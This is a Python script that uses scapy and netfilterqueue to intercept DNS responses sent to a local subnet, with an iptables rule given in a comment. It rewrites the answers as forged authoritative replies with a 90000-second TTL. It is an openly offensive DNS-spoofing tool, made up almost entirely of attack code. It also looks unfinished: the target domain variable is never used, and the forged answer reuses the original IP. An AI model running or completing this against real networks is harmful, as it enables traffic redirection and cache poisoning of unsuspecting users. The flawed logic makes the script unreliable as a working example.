from scapy.all import *
from netfilterqueue import NetfilterQueue
import ipaddress


# sudo iptables -A INPUT --dst 10.100.102.0/24 -p udp --sport 53 -j NFQUEUE --queue-num 1


def dnsSpoof(packet):
    originalPayload = IP(packet.get_payload())

    # check if this dns pakcet if no release it
    if originalPayload.haslayer(DNSQR) and int(originalPayload[DNS].qd.qtype) == 1:
        #print(str(originalPayload[DNS].qd.show()))
       #print(int(originalPayload[DNS].qd.qtype))
        # print(str(originalPayload[DNS].an.rdata))
        try:
           # print(str(originalPayload[DNS].qd.show()))
            print("send spoof")
            ipaddress.ip_address(str(originalPayload[DNS].an.rdata))
            ip_dns = str(originalPayload[DNS].an.rdata)
            spoofedPayload = IP(dst=originalPayload[IP].dst, src=originalPayload[IP].src) / \
                             UDP(dport=originalPayload[UDP].dport, sport=originalPayload[UDP].sport) / \
                             DNS(id=originalPayload[DNS].id, qr=1, aa=1, qd=originalPayload[DNS].qd,
                                 an=DNSRR(rrname=originalPayload[DNS].qd.qname, ttl=applyttl,
                                          rdata=ip_dns))
            #str(spoofedPayload)
            packet.set_payload(bytes(spoofedPayload))
            #packet.accept()


        except ValueError:
            packet.accept()
         #print(str(originalPayload[DNS].an.rdata))
        except AttributeError:
            packet.accept()
        finally:
            packet.accept()
    else:
        packet.accept()

applyttl = 90000
urlToSpoof = 'demo.com'
queueId = 1
nfqueue = NetfilterQueue()
nfqueue.bind(queueId, dnsSpoof)

try:

    print("------------------------------------------")
    nfqueue.run()
except KeyboardInterrupt:
    pass
